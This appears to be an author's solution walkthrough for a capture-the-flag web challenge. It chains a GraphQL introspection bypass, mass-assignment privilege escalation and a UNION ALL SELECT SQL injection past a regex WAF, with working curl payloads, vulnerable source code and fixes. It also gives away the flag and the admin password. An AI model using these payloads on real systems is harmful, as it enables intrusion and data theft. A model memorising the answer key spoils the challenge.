# NexaCorp Challenge — Full Author Walkthrough

> **AUTHOR EYES ONLY — Do not include in the Docker image**

**Flag:** `Pioneers25{gr4phql_1ntr0sp3ct10n_byp4ss_m4ss_4ss1gnm3nt_4nd_un10n_sql_1nj3ct10n_ch41n3d}`

---

## Stage 1 — Endpoint Discovery

**Goal:** Find the hidden API endpoint.

Players see a corporate login page at `http://target:3000/`. No separate JS files, no obvious API paths.

### What they try:

```bash
# Look at page source
curl -s http://target:3000/
```

One HTML comment stands out:
```html
<!-- TODO @devops: remove X-Dev-Mode bypass before final production deployment -->
```

Players note the header name `X-Dev-Mode` for later.

### FAIL — Guessing common API paths:

```bash
curl -s http://target:3000/api          # 404
curl -s http://target:3000/api/v1       # 404
curl -s http://target:3000/rest         # 404
```

### The right approach — Intercept traffic:

Players open **browser DevTools** (Network tab) or a **proxy (Burp Suite)** and try
to login or register through the web UI. They observe a POST request to:

```
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"mutation L($u:String!,$p:String!){login(username:$u,password:$p){token user{id username role}}}","variables":{"u":"test","p":"test"}}
```

**Alternative:** Players who read the inline minified JS carefully may notice a
base64-encoded string `atob("L2dyYXBocWw=")` which decodes to `/graphql`.

Now they know: **It's a GraphQL API at `/graphql`**.

---

## Stage 2 — Schema Enumeration (Introspection Bypass)

**Goal:** Read the API schema.

### FAIL — Direct introspection:

```bash
curl -s -X POST http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

```json
{"errors":[{"message":"GraphQL introspection is not allowed, except in development mode."}]}
```

### FAIL — Common bypass attempts:

```bash
# Query param?
curl -s "http://target:3000/graphql?debug=true" ...
# → Still blocked

# POST body param?
curl -s ... -d '{"query":"{ __schema { types { name } } }","debug":true}'
# → Still blocked

# Different header names?
curl -s ... -H "X-Debug: true" ...
# → Still blocked
```

### SUCCESS — Use X-Dev-Mode: 1 header (from the HTML comment hint):

```bash
curl -s -X POST http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "X-Dev-Mode: 1" \
  -d '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name } } types { name kind fields { name type { name kind ofType { name } } } } } }"}'
```

Full schema returned. Key findings:

| Thing | What it reveals |
|---|---|
| `UpdateProfileInput.role` | Field that should have been removed — mass assignment vector |
| `searchEmployees(query: String!)` | Admin-only search — likely injection target |
| `adminPanel` | Admin-only dashboard |
| `updateProfile` returns `token` | Re-issues JWT after profile update |

---

## Stage 3 — Privilege Escalation (Mass Assignment)

**Goal:** Get admin access.

### Register a normal account:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { register(username: \"hacker\", password: \"hacker123\") { token user { id username role } } }"}'
```

```json
{"data":{"register":{"token":"eyJ...","user":{"id":"2","username":"hacker","role":"employee"}}}}
```

Save: `TOKEN=eyJ...`

### FAIL — Access admin query as employee:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ searchEmployees(query: \"Alice\") { name } }"}'
```

```json
{"errors":[{"message":"Admin privileges required."}]}
```

### FAIL — Register directly as admin:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { register(username: \"admin2\", password: \"admin123\", role: \"admin\") { token } }"}'
```

GraphQL error — `register` mutation doesn't accept a `role` argument.

### FAIL — Brute-force admin password:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { login(username: \"admin\", password: \"admin\") { token } }"}'
```

```json
{"errors":[{"message":"Invalid username or password."}]}
```

Password `CorpAdmin2024!` is not guessable.

### SUCCESS — Mass assignment via updateProfile:

The schema showed `UpdateProfileInput` has a `role` field. Use it:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateProfile(input: { role: \"admin\" }) { token user { role } } }"}'
```

```json
{"data":{"updateProfile":{"token":"eyJ...(new)","user":{"role":"admin"}}}}
```

Save: `ADMIN_TOKEN=eyJ...(new)`

---

## Stage 4 — SQL Injection (WAF Bypass)

**Goal:** Extract the flag from the database.

### Verify admin access and test normal search:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"query":"{ searchEmployees(query: \"Alice\") { id name department salary } }"}'
```

Returns Alice's data. Search works.

### FAIL — Classic UNION SELECT:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION SELECT 1,2,3,4--" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

```json
{"errors":[{"message":"WAF: UNION SELECT pattern is not allowed."}]}
```

### FAIL — Inline comment bypass:

```bash
curl -s ... -d "$(jq -n --arg q "x' UNION/**/SELECT 1,2,3,4--" ...)"
```

```json
{"errors":[{"message":"WAF: SQL block comments (/*) are not allowed."}]}
```

### FAIL — UNION ALL SELECT with -- terminator:

```bash
curl -s ... -d "$(jq -n --arg q "x' UNION ALL SELECT 1,2,3,4--" ...)"
```

```json
{"errors":[{"message":"WAF: SQL single-line comments (--) are not allowed."}]}
```

Players try `;` and get:
```json
{"errors":[{"message":"WAF: semicolons are not allowed."}]}
```

### KEY INSIGHT — Map all 4 WAF rules:

| Input | Error |
|---|---|
| `UNION SELECT` | `WAF: UNION SELECT pattern is not allowed.` |
| `--` | `WAF: SQL single-line comments (--) are not allowed.` |
| `/*` | `WAF: SQL block comments (/*) are not allowed.` |
| `;` | `WAF: semicolons are not allowed.` |

**Not blocked:** `UNION ALL SELECT` — the word `ALL` sits between UNION and SELECT,
breaking the `\s+` regex match.

**No comments needed:** close the trailing `%'` by ending with `WHERE 'a' LIKE '`
— the template appends `%'` making it `LIKE '%'` (always true, valid SQL).

### FAIL — Right bypass, wrong column count:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,2,3 WHERE 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

```json
{"errors":[{"message":"Database error: SELECTs to the left and right of UNION ALL do not have the same number of result columns"}]}
```

### SUCCESS — 4 columns:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,2,3,4 WHERE 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

Returns data — **4 columns confirmed**. Column 2 maps to `name` in the response.

### Enumerate tables:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,name,type,0 FROM sqlite_master WHERE type='table' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

Reveals tables: `users`, `employees`, `secrets`

### Read secrets schema:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT 1,sql,'x',0 FROM sqlite_master WHERE name='secrets' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')"
```

Shows: `CREATE TABLE secrets (id ..., key TEXT, value TEXT)`

### Extract flag:

```bash
curl -s http://target:3000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d "$(jq -n --arg q "x' UNION ALL SELECT id,value,'x',0 FROM secrets WHERE key='flag' AND 'a' LIKE '" \
    '{query:"query($q:String!){searchEmployees(query:$q){name}}",variables:{q:$q}}')" | jq .
```

```json
{
  "data": {
    "searchEmployees": [
      { "name": "Pioneers25{gr4phql_1ntr0sp3ct10n_byp4ss_m4ss_4ss1gnm3nt_4nd_un10n_sql_1nj3ct10n_ch41n3d}" }
    ]
  }
}
```

---

## Understanding the Source Code Vulnerabilities

Now let's examine the source code to understand why each stage of our attack worked.

### Vulnerability 1: Introspection Bypass

**Location:** `server.js`

```javascript
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  context: ({ req }) => {
    // Check for dev mode bypass header
    const devMode = req.headers['x-dev-mode'] === '1';
    if (devMode) {
      process.env.NODE_ENV = 'development';  // ← CRITICAL FLAW
    }

    return { req, db };
  },
});
```

**The flaw:**
- Introspection is supposed to be disabled in production
- But the `X-Dev-Mode: 1` header **temporarily overwrites** `process.env.NODE_ENV`
- This was meant as a debug feature but was left enabled in production
- The HTML comment `<!-- TODO @devops: remove X-Dev-Mode bypass -->` hints at this oversight

### Vulnerability 2: Mass Assignment

**Location:** `resolvers.js`

```javascript
updateProfile: async (_, { input }, { req, db }) => {
  const userId = getUserIdFromToken(req);

  // Build update object from ALL input fields
  const updates = {};
  if (input.email) updates.email = input.email;
  if (input.bio) updates.bio = input.bio;
  if (input.role) updates.role = input.role;  // ← SHOULD NOT BE HERE!

  db.prepare(`
    UPDATE users
    SET ${Object.keys(updates).map(k => `${k} = ?`).join(', ')}
    WHERE id = ?
  `).run(...Object.values(updates), userId);

  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
  const token = jwt.sign({ id: user.id, role: user.role }, JWT_SECRET);

  return { token, user };
}
```

**The flaw:**
- The `UpdateProfileInput` type in the GraphQL schema includes a `role` field
- The resolver blindly accepts and applies it without checking if the user is authorized to change roles
- This is a classic **mass assignment** vulnerability where the backend trusts client input for sensitive fields

**Proper fix would be:**
```javascript
// Only allow role updates for admins
if (input.role && currentUser.role !== 'admin') {
  throw new Error('Unauthorized');
}
```

### Vulnerability 3: SQL Injection

**Location:** `resolvers.js` - searchEmployees resolver

```javascript
searchEmployees: async (_, { query }, { req, db }) => {
  requireAdmin(req);

  // Vulnerable: direct string interpolation
  const sql = `SELECT * FROM employees WHERE name LIKE '%${query}%'`;
  const results = db.prepare(sql).all();

  return results;
}
```

**The flaw:**
- User input `query` is **directly interpolated** into the SQL string
- No parameterized queries or prepared statements
- The WAF attempts to block common SQL injection patterns but has gaps:
  ```javascript
  function sqlWAF(query) {
    const patterns = [
      /UNION\s+SELECT/i,  // ← Blocks "UNION SELECT" but not "UNION ALL SELECT"
      /--/,               // Blocks double-dash comments
      /\/\*/,             // Blocks block comments
      /;/                 // Blocks semicolons
    ];

    for (const pattern of patterns) {
      if (pattern.test(query)) {
        throw new Error(`WAF: ${pattern.source} is not allowed.`);
      }
    }
  }
  ```

**Why `UNION ALL SELECT` bypasses the WAF:**
- The regex `/UNION\s+SELECT/i` requires **whitespace** followed immediately by SELECT
- `UNION ALL SELECT` has `ALL` between UNION and the whitespace before SELECT
- The regex doesn't match this pattern

**Why `WHERE 'a' LIKE '` works as a terminator:**
- The original query ends with `%'`
- Our injection: `x' UNION ALL SELECT 1,2,3,4 WHERE 'a' LIKE '`
- Final SQL: `SELECT * FROM employees WHERE name LIKE '%x' UNION ALL SELECT 1,2,3,4 WHERE 'a' LIKE '%'`
- `'a' LIKE '%'` is always true, making valid SQL syntax

---

## Summary

| Stage | Vulnerability | What blocks players | Bypass |
|---|---|---|---|
| 1 | Source code recon | No obvious API endpoint | Intercept traffic / decode base64 in inline JS |
| 2 | Introspection bypass | Returns "not allowed" error | `X-Dev-Mode: 1` header |
| 3 | Mass assignment | `role: "employee"` on register | `updateProfile(input: { role: "admin" })` |
| 4 | SQL injection | WAF blocks `UNION SELECT`, `--`, `/*`, `;` | `UNION ALL SELECT` + `WHERE 'a' LIKE '` |
